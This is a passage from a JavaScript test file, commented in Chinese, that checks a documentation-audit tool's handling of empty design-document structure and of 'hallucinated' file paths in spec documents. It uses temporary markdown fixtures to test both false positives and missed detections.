  const bare = '# T\n\n## 随便写点\n\n一句话。\n'
  const errs3 = checkTddStructure(bare).map((e) => e.code)
  if (errs3.length < 5) return `空壳 TDD 只报了 ${errs3.length} 条：${errs3.join(',')}`

  // 反向 2：模块表只有表头要单独报
  const emptyTable = [
    '# x TDD', '',
    '## 文档信息', '', '- 文档版本 1.0', '- 基线：源码', '',
    '## 背景与非目标', '', '- 核心定位：给运维用', '- 非目标：不做多租户', '',
    '## 系统架构', '', '模块与目录职责：', '', '### 模块与目录职责', '', '| 模块 | 职责 | 依赖方向 | 入口文件 |', '| --- | --- | --- | --- |', '',
    '## 主链路', '', '正常主链路：读入 -> 落盘。', '',
    '## 不变量', '', '- 单一真相源', '',
  ].join('\n')
  if (!checkTddStructure(emptyTable).some((e) => e.code === 'EMPTY_TDD_MODULES')) {
    return '模块表只有表头却没报——那张表等于没写'
  }
  return true
}])

// 误报的代价是人开始忽略这条检查。
//
// 「讲不做什么」时会说「不动那条旧路径」，「讲实现说明」时会说「删掉了哪个文件」，
// 这些位置的路径本来就不该存在。在那里报幻觉路径，人第一次会改，第三次就不看了。
cases.push(['讲不做与讲删除的地方，不存在的路径不是幻觉', async () => {
  const { auditDoc } = await import('../../kit/skills/dev-plan/scripts/doc-audit.mjs')
  const fs = await import('node:fs')

  const dir = tmpProject({ 'README.md': '# p\n\n路径误报测试仓。\n' })
  const w = (rel, text) => { mkdirSync(join(dir, rel, '..'), { recursive: true }); fs.writeFileSync(join(dir, rel), text) }
  try {
    // 正向：这三处提到不存在的路径都该放过
    w('docs/specs/a.md', [
      '---', 'kind: spec', 'title: 探针', 'status: draft', 'owner: p', '---', '',
      '# 探针', '',
      '## 背景', '', '当前流程有问题，需要改。', '',
      '## 不在本次范围', '', '- 不动 legacy/old-runner.mjs', '',
      '## 删除清单', '', '- 已删除 src/removed-file.mjs', '',
      '## 验收标准', '', '- [ ] C1: 退出码 0', '',
    ].join('\n'))
    const r = auditDoc({ repoRoot: dir, file: 'docs/specs/a.md' })
    const fp = r.errors.filter((e) => e.code === 'HALLUCINATED_PATH')
    if (fp.length > 0) return `讲不做/讲删除的地方被误报：${fp.map((e) => e.message.slice(0, 40)).join('；')}`

    // 反向：真要引用一个不存在的新文件，必须报——否则这条检查等于被删掉
    w('docs/specs/b.md', [
      '---', 'kind: spec', 'title: 探针二', 'status: draft', 'owner: p', '---', '',
      '# 探针二', '',
      '## 背景', '', '当前流程有问题，需要改，改动落在 src/ghost-real.mjs。', '',
      '## 不在本次范围', '', '- 不动调度器', '',
      '## 验收标准', '', '- [ ] C1: 退出码 0', '',
    ].join('\n'))
    const r2 = auditDoc({ repoRoot: dir, file: 'docs/specs/b.md' })
    if (!r2.errors.some((e) => e.code === 'HALLUCINATED_PATH')) {
      return '正文里引用了不存在的文件却没报——那这条检查等于不存在'
    }
    return true
  } finally { rmTree(dir) }
}])

}
